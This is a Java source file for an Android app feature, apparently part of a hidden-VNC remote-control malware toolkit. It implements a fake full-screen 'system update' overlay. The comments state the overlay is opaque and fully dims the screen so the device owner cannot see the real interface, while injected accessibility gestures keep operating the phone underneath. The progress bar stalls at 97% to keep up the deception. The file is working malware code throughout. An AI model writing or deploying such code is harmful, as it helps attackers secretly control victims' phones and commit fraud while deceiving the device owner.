package com.fason.app.features.hvnc;

import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.fason.app.R;
import com.fason.app.core.FasonApp;

/**
 * Full-screen, fully opaque fake "system update" overlay.
 *
 * The window is opaque (PixelFormat.OPAQUE), its content is drawn over solid
 * black and everything behind it is dimmed to 100% (FLAG_DIM_BEHIND with
 * dimAmount = 1f), so the device user cannot see anything of the real UI.
 * FLAG_NOT_TOUCHABLE keeps accessibility-injected gestures (InputInjector) and
 * physical touches working on the window below.
 */
public final class FakeUpdateOverlay {
    private static final String TAG = "FakeUpdateOverlay";
    private static final long TICK_MS = 400;
    private static final float DEFAULT_ALPHA = 1f;

    private static final String[] STAGES = {
        "Preparing update…",
        "Verifying package integrity…",
        "Optimizing apps…",
        "Installing update…",
        "Finalizing…",
    };

    private static volatile FakeUpdateOverlay instance;

    private final Handler main = new Handler(Looper.getMainLooper());

    private WindowManager wm;
    private View root;
    private WindowManager.LayoutParams params;
    private ProgressBar bar;
    private TextView percentView;
    private TextView stageView;
    private boolean visible;
    private float alpha = DEFAULT_ALPHA;
    private int progress;
    private long startedAt;

    private final Runnable ticker = new Runnable() {
        @Override
        public void run() {
            if (!visible) return;
            progress = Math.min(97, progress + 1);
            if (bar != null) bar.setProgress(progress);
            if (percentView != null) percentView.setText(progress + "%");
            if (stageView != null) {
                long elapsed = System.currentTimeMillis() - startedAt;
                int idx = (int) Math.min(STAGES.length - 1, elapsed / 6000);
                stageView.setText(STAGES[idx]);
            }
            main.postDelayed(this, TICK_MS);
        }
    };

    private FakeUpdateOverlay() {}

    public static FakeUpdateOverlay getInstance() {
        if (instance == null) {
            synchronized (FakeUpdateOverlay.class) {
                if (instance == null) instance = new FakeUpdateOverlay();
            }
        }
        return instance;
    }

    public static boolean canDraw(Context ctx) {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(ctx);
    }

    public static void requestPermission(Context ctx) {
        try {
            Intent i = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) {
            Log.e(TAG, "open overlay settings failed", e);
        }
    }

    public boolean isVisible() { return visible; }
    public float getAlpha() { return alpha; }

    public void show() { show(DEFAULT_ALPHA); }

    public void show(float startAlpha) { main.post(() -> showInternal(startAlpha)); }
    public void hide() { main.post(this::hideInternal); }
    public void setAlpha(float a) { main.post(() -> setAlphaInternal(a)); }

    private void showInternal(float startAlpha) {
        if (visible) {
            setAlphaInternal(startAlpha);
            return;
        }
        Context ctx = FasonApp.getContext();
        if (!canDraw(ctx)) {
            Log.w(TAG, "overlay permission not granted");
            return;
        }
        try {
            wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            root = LayoutInflater.from(ctx).inflate(R.layout.overlay_fake_update, null);
            bar = root.findViewById(R.id.ovBar);
            percentView = root.findViewById(R.id.ovPercent);
            stageView = root.findViewById(R.id.ovStage);

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

            params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                    | WindowManager.LayoutParams.FLAG_DIM_BEHIND,
                PixelFormat.OPAQUE);
            params.gravity = Gravity.TOP | Gravity.START;
            params.alpha = 1f;
            params.dimAmount = 1f;

            wm.addView(root, params);

            visible = true;
            alpha = clamp(startAlpha);
            root.setAlpha(alpha);
            progress = 0;
            startedAt = System.currentTimeMillis();
            if (bar != null) bar.setProgress(0);
            main.removeCallbacks(ticker);
            main.postDelayed(ticker, TICK_MS);
            Log.i(TAG, "fake update overlay shown (opaque, dimAmount=1)");
        } catch (Exception e) {
            Log.e(TAG, "show failed", e);
            cleanup();
        }
    }

    private void hideInternal() {
        if (!visible) return;
        main.removeCallbacks(ticker);
        try {
            if (root != null && wm != null) wm.removeView(root);
        } catch (Exception e) {
            Log.w(TAG, "removeView failed: " + e.getMessage());
        }
        cleanup();
        Log.i(TAG, "fake update overlay hidden");
    }

    private void setAlphaInternal(float a) {
        alpha = clamp(a);
        if (root != null) root.setAlpha(alpha);
        if (params != null && wm != null && root != null) {
            params.alpha = 1f;
            params.dimAmount = 1f;
            try { wm.updateViewLayout(root, params); } catch (Exception ignored) {}
        }
    }

    private void cleanup() {
        visible = false;
        root = null;
        params = null;
        bar = null;
        percentView = null;
        stageView = null;
        wm = null;
    }

    private static float clamp(float a) {
        return Math.max(0.05f, Math.min(a, 1f));
    }
}
